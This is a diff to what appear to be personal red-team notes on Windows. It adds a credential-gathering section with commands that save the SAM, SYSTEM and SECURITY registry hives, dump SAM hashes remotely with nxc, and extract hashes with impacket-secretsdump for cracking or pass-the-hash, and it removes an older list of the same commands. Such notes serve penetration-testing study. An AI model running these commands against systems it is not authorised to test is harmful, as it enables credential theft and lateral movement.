@@ -153,7 +153,22 @@ $ hashcat -m 22100 myhash wordlist
 
 <div class="row row-cols-lg-2"><div>
 
-...
+#### Credentials Gathering (Static)
+
+If you have enough privileges to access the registry <small>(not necessarily admin, but not a normal user)</small>, you can dump the three hives:
+
+```ps
+PS> reg save hklm\system C:\XXX\system.hive
+PS> reg save hklm\sam C:\XXX\sam.hive
+PS> reg save hklm\security C:\XXX\security.hive
+$ nxc smb IP --local-auth -u xxx -p yyy --sam # remote dump
+```
+
+Use [file transfer methods](/cybersecurity/red-team/_knowledge/topics/file_transfer.md) such as SMB and [secretsdump](/operating-systems/networking/protocols/tools/impacket.md) to dump them. We would then try to [crack](/cybersecurity/cryptography/algorithms/hashing/index.md#hash-cracking) or pass the hash.
+
+```shell!
+$ impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL
+```
 </div><div>
 </div></div>
 
@@ -233,9 +248,6 @@ Stuff that I found, but never read/used yet.
 </div><div>
 
 * Windows Tilde Filenames (Refer to IIS)
-* backup the SAM and SYSTEM hashes
-    * `reg save hklm\system C:\XXX\system.hive`
-    * `reg save hklm\sam C:\XXX\sam.hive`
 * Windows Defender Firewall
   * Block access to share if not in the same workgroup?
 * Application Whitelisting 
